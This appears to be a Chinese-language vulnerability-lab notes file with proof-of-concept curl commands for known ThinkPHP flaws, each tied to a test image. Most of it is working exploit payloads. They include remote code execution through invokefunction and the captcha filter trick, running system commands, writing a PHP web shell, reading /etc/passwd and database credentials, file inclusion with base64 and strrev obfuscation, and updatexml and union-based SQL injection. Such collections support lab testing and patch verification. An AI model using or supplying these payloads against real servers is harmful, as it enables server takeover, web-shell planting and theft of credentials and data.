## Thinkphp 5 controller 路由代码执行漏洞

测试镜像

* src/thinkphp/5.0.16/

影响范围

* 5.0.X - 5.0.23
* 5.1.X - 5.1.31

Poc - 1

```bash
# 执行代码
curl -g '127.0.0.1/public/index.php?s=index/\think\app/invokefunction&function=assert&vars[0]=phpinfo();'

# 执行命令
curl -g '127.0.0.1/public/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'

# 写文件
curl -g '127.0.0.1/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=info.php&vars[1][]=<?php%20system($_GET[0]);?>'

# 获取参数
curl -g '127.0.0.1/public/index.php/?s=index/\think\config/get&name=database.username'
curl -g '127.0.0.1/public/index.php/?s=index/\think\config/get&name=database.password'
```

Poc - 2

```bash
# 执行命令
curl -g '127.0.0.1/public/index.php/?s=captcha' --data 's=cat /etc/passwd&_method=__construct&method=&filter[]=system'

# 包含文件 - 普通
curl -g '127.0.0.1/public/index.php/?s=captcha' --data 's=../runtime/log/201909/01.log&_method=__construct&method=&filter[]=think\__include_file'

# 包含文件 - php://filter + strrev
echo '<?php phpinfo(); ?>' | base64 > /tmp/test.txt
curl -g '127.0.0.1/public/index.php/?s=captcha' --data 's=txt.tset/pmt/=ecruoser/edoced-46esab.trevnoc=daer/retlif//:php&_method=__construct&method=&filter[]=strrev&filter[]=think\__include_file'

# 多个 filter 嵌套 - base64_decode
curl -g '127.0.0.1/public/index.php/?s=captcha' --data 's=L2V0Yy9wYXNzd2Q=&_method=__construct&method=&filter[]=base64_decode&filter[]=think\__include_file'
```


参考文档

* [thinkphp5框架缺陷导致远程代码执行](https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ)
* [Thinkphp5 远程代码执行漏洞事件分析报告](https://paper.seebug.org/770/)
* [thinkphp_v5_rce.txt](https://github.com/coffeehb/Some-PoC-oR-ExP/blob/a9f165d7bc5bcc2b5e03153577bdfd83f35b0564/thinkphp/thinkphp_v5_rce.txt)

## Thinkphp preg_replace 代码执行漏洞

测试镜像

* src/thinkphp/2.0/

说明

* 当 `URL_PATHINFO_MODEL` 设置为 `1` 时存在代码执行漏洞

Poc

```
curl -g 'http://127.0.0.1/index.php/module/action/param1/$%7B@system($_POST[0])%7D' -d 0=ls
```

## Thinkphp 5.0.16 insert 注入漏洞

测试镜像

* src/thinkphp/5.0.16/

影响版本

- Thinkphp < 5.0.16

参考文档

* [ThinkPHP框架 5.0.x sql注入漏洞分析](https://paper.seebug.org/564/)

Poc

```
curl '127.0.0.1/public/index.php/index/index/testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
```

## Thinkphp3.2.3 update注入漏洞

测试镜像

* src/thinkphp/3.2.3/

影响版本

* Thinkphp < 3.2.3

参考链接

* [Thinkphp3.2.3最新版update注入漏洞](https://paper.seebug.org/573/)

Poc

```shell
curl -g 'http://172.17.0.2/index.php/home/user?user[0]=bind&user[1]=money_0%20or%201%20and(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))&money=qwe'
```

返回内容包含sql报错：XPATH syntax error: '~root@localhost~'



## Thinkphp exp表达式注入漏洞

测试镜像

* src/thinkphp/3.2.3/

影响版本

* Thinkphp 3.x 5.x

参考文档

* [ThinkPHP框架架构上存在SQL注入](https://www.secpulse.com/archives/29826.html)

Poc

```shell
curl -g 'http://172.17.0.2/index.php/home/user/exp_inject?id[]=exp&id[]=%3d888%20union%20select%201,database(),3%23'
```

